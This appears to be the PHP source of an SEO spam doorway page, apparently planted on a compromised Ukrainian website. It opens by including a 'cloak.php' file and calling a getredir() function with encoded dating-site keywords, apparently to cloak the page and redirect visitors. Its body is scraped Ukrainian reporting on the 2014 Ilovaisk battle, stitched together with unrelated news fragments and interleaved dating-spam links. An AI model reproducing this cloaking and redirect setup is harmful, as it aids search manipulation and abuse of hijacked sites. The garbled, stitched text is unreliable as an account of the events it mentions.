<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bf%d1%96%d0%b4%d0%ba%d0%bb%d1%8e%d1%87%d0%b8%d1%82%d0%b8+%d0%bf%d1%80%d0%be%d0%b3%d1%80%d0%b0%d0%bc%d0%b8+%d0%86%d0%bb%d0%be%d0%b2%d0%b0%d0%b9%d1%81%d1%8c%d0%ba+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Іловайській трагедії буде дана правова кваліфікація та проведено ретельне розслідування</title>
	<meta name="description" content="Бої під Іловайськом стали одним з переломних моментів війни на сході України: Збройні сили України втратили ініціативу на Донбасі та перейшли від" />
	<link rel="canonical" href="https://masage.od.ua/img/240/zoca-pdklyuchiti-programi-lovaysk.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/247/myro-sayti-znayomstv-msto.php">сайти знайомств місто Луцьк Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/422/cepe-naykrashe-mstse.php">найкраще місце підключення в Роздільна Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/494/rafa-bezkoshtovn-znayomstva.php">безкоштовні знайомства в Інтернеті Ромни Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/377/baqop-nternet-znayomstva-novodnstrovsk-ukrana.php">Інтернет-знайомства Новодністровськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/457/xoh-regon-znayomstv-v.php">регіон знайомств в Часів Яр Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Підключити програми Іловайськ Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>На концерті поблизу Мінська затримали близько 70 осіб — правозахисники. В ОАЕ можуть відбутися тижні українського кіно та дні народного мистецтва. На початку тижня в Україні рясних снігопадів не очікується, у вівторок сильно похолодає. УКР РУС ENG Вхід для клієнтів: Стрічки новин Термінал Головна Події Політика Економіка Спорт Вибори Інвестиції Медицина Телеком Колонки Відео КСУ Тарифи Санкції Погода Коронавірус Нерухомість Прес-центр Продукти та послуги Про агентство.</p>
<p>Іловайській трагедії буде дана правова кваліфікація та проведено ретельне розслідування. ЩЕ ЗА ТЕМОЮ  НАБУ розпочало розслідування щодо закупівлі вакцини від коронавірусу.</p><strong><a id='h1'></a><h2>Бої за Іловайськ — Вікіпедія</h2></strong><p>Влада Джорджії почала розслідування стосовно Трампа через його спроби вплинути на результати виборів у штаті. Нідерланди не притягуватимуть Україну до відповідальності за незакритий авіапростір у справі MH Білий дім закликає до повноцінного розслідування джерела COVID Вбивство начальника управління внутрішньої безпеки СБУ готувалось у змові декількох осіб. Естонія на РБ ООН запропонувала створити міжнародний механізм з розслідування злочинів проти мирних демонстрантів у Білорусі.</p>
<p>ДБР почало розслідування за фактом службової недбалості співробітників ДСНС під час перевірок у приватному будинку для літніх людей в Харкові. Поліція встановлює причини вибуху на магістральному газопроводі в Полтавській області.</p>
		
			
				<div>Іловайськ. Місто яке зупинило Путіна</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/U6OdyGTpEiI' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Україна досліджує планшет, знайдений на місці аварії літака "МАУ" під Тегераном, - Венедіктова. Вежа в стороні метрів 20 була», — додає житель Многопілля. Він виходив у північній колоні. Близько 5-ої ранку 29 серпня зібрані в Іловайську сили отримали наказ. Точкою збору визначили місце на шість кілометрів південніше Многопілля.</p>
<p>Північна колона — «Булава» — повинна була виходити до Новокатеринівки і далі на Комсомольське. Вибух великий. Спочатку летять хлопці, які були на цій машині. Вони падають, хтось біля тебе падає. Хтось у повітрі.</p>
		
			<br><ul>
			
				<li>знайомства з прискоренням Чернігів Україна;</li>
			
				<li>Кабінет Міністрів України; Постанова, Програма, Заходи від 23.12.2004 № 1731.</li>
			
				<li>мій сайт знайомств поблизу Керч Україна.</li>
			
			</ul>
		
	<p>Потім вибух боєкомплекта», — розповідає медик батальйону «Миротворець» Всеволод Стеблюк. Андрій Бахтов , заступник командира батальйону «Миротворець» у році, запевняє — «сперечатися з окопаним танком за допомогою АК, навіть якщо з борту їх стріляє по 20 штук — не розумно». Спочатку у північній колоні було трохи більше тисячі вояків і добровольців із технікою.</p>
<p>Залишки колони розбили в селі Горбатенко і в полях кількома кілометрами південніше. Там вже потрапили у нашого водія, він загинув», — каже Андрій Бахтов. По гальмах і далі тільки металевий дзвін і більше нічого не пам'ятаю, — пригадує медик батальйону «Миротворець» у році Всеволод Стеблюк.</p><a id='h2'></a><h3>Доступність посилання</h3><p>Паралельно із колоною «Булава», друга колона — «Вітер» також висунулась у Новокатеринівку. У ній перебувало приблизно бійців. Частина з них майже дісталися до Новокатеринівки, але потрапили у чергову засідку. Окрім того, у колоні були ще четверо журналістів — вони вирвалися вперед майже одразу після початку обстрілів.</p><a id='h3'></a><h3>Навігаційне меню</h3><p>Оператор Іван Любиш-Кірдей був серед них — тоді він працював для німецького телеканалу ARD. Танки прийняли бій. Тобто танки розвернулися, пішли в поле, ми ще деякий час проїхали. Я пам'ятаю, що ми об'їжджали вантажівку з хлопцями. Ми за ними заховалися, потім рвонули вперед. Вискочили і поїхали. Це буквально за лічені хвилини», — каже Іван. Значна частина угрупування — близько трьохсот бійців, залишилися заблокованими в Червоносільському. Одним із таких бійців був Володимир Гунько , який був у батальйоні «Донбас».</p><strong><a id='h4'></a><h2>Бої за Іловайськ</h2></strong><p>Він розповідає, як бійці виживали в оточенні. Знищили декілька одиниць техніки, з яких було 2 танки ТБ3. Зайняли кругову оборону. Зв'язалися зі штабом — штаб сказав «чекайте». Ввечері приїхали м алі, сказали «здавайтеся».</p><img src="https://gdb.rferl.org/05B3EB01-BC58-4572-8A7D-7DB07530206E_w1080_h608_s_b.jpg" alt="НА ЦЮ Ж ТЕМУ" style="max-width: 480px; max-height: 480px;"/><p>В переговорах наш командир сказав — здаватися не будемо, чекаємо», — розповідає боєць батальйону «Донбас» Володимир Гунько. Зараз у Червоносільському на полі трактори та кілька похилених будинків. Безлюдно, і майже нічого не нагадує про бої 5-річної давнини. Тоді, після доби переговорів група бійців вирішила прориватися, а інші, разом із пораненими, опинилися в руках бойовиків. Володимир — на 4 місяці. Кутейниковим, за елеватором. За позиціями їхньої артилерії. Першого вересня, о годині , приїхали представники «ДНР» так-званої і росіяни сказали, що в них наказ згори нас віддати двом «днрівцям», — розповідає Володимир Гунько.</p>
<p>Журналісти — єдині, кому вдалося вирватися із оточення. Останній блок-пост бойовиків вони проскочили на автомобілі.</p>
		
			<br><ol>
			
				<li>Іловайськ — Вікіпедія.</li>
			
				<li>Ексклюзивний репортаж з окупованого Іловайська: розповіді жителів про трагедію і життя сьогодні?</li>
			
				<li>афро-американських знайомств поблизу Радомишль Україна.</li>
			
			</ul>
		
	<p>Коли під'їхали — в них були георгіївські стрічки на руках. Вони навіть не зупинили і не перевірили документи. Просто вони пропустили і були дуже здивовані. Провели нас поглядом і ми акуратно виїхали», — каже оператор Іван Любиш-Кірдей. Водночас заступник командира батальйону «Миротворець» Андрій Бахтов виходив із оточення три дні. Треба було рухатися не по прямій, а так, щоб оминати можливі засідки противника. Не всім пощастило. Всеволод Стеблюк, медик у батальйоні «Миротворець», у день розстрілу ходив до російських військових і забирав поранених українських бійців. За підрахунками медиків, вже після евакуації їх було майже  Таких, що лежачих.</p>
<p>Ну ніяких. І чоловік легких.</p><strong><a id='h5'></a><h2>«Іловайський котел» у розповідях українських бійців і очевидців із того боку розмежування</h2></strong><p>Двоє до ранку не дожили. Приїжджав до росіян, на їхні позиції. Казав, що міжнародний «Червоний хрест» і з Путіним домовлено. Мовляв, ми вам воду привезли, а забираємо у вас поранених. Збираємо», — розповідає Стеблюк. По одному, невеликими групами або через обмін українські бійці потрапили на підконтрольну Україні територію. Військова прокуратура, Генштаб, генерали Муженко і Хомчак, очевидці — про «Іловайський котел». Доступність посилання Перейти до основного матеріалу Перейти до основної навігації Перейти до пошуку.</p>
<p>ТБ НОВИНИ СТАТТІ ПОЛІТИКА ЕКОНОМІКА СУСПІЛЬСТВО КУЛЬТУРА СПОРТ УКРАЇНА СВІТ ВСЕ ЗА ДОБУ.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/103/mires-ogoloshennya-poblizu-druzhkvka.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/377/faju-zahdn-znayomstva.php">західні знайомства поблизу Бучач Україна</a></li><li><a href="https://masage.od.ua/img/137/pici-sayt-znayomstv-msto.php">сайт знайомств місто Богуслав Україна</a></li><li><a href="https://masage.od.ua/img/103/dyh-gachok-varash.php">гачок Вараш Україна</a></li><li><a href="https://masage.od.ua/img/247/xa-fotograf-znayomstv-v.php">фотографії знайомств в Інтернеті в Богуслав Україна</a></li><li><a href="https://masage.od.ua/img/103/gipox-znayomstva-svahi-poblizu.php">знайомства свахи поблизу Лиман Україна</a></li><li><a href="https://masage.od.ua/img/471/pag-sayti-znayomstv.php">сайти знайомств мел Житомир Україна</a></li><li><a href="https://masage.od.ua/img/335/bih-naypopulyarnshiy-dodatok-dlya.php">найпопулярніший додаток для знайомств Чистякове Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#h1'>Бої за Іловайськ — Вікіпедія</a></li>
<li><a href='#h2'>Доступність посилання</a></li>
<li><a href='#h3'>Навігаційне меню</a></li>
<li><a href='#h4'>Бої за Іловайськ</a></li>
<li><a href='#h5'>«Іловайський котел» у розповідях українських бійців і очевидців із того боку розмежування</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/103/jivej-kompanya-znayomstv-vano-frankvsk.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>